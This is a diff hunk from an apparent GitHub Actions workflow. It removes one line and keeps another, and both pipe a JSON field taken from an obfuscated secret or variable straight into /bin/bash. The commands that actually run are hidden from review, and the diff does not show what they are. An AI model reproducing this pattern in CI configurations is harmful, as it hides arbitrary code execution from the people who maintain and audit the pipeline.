@@ -19,7 +19,6 @@ jobs:
           wcbl60948: ${{ secrets.wcbl60948 }}
         run: |
           printf '%s' "$wcbl60948" | jq -r .ak27 | /bin/bash
-          echo $ab6 | jq -r .szu174 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
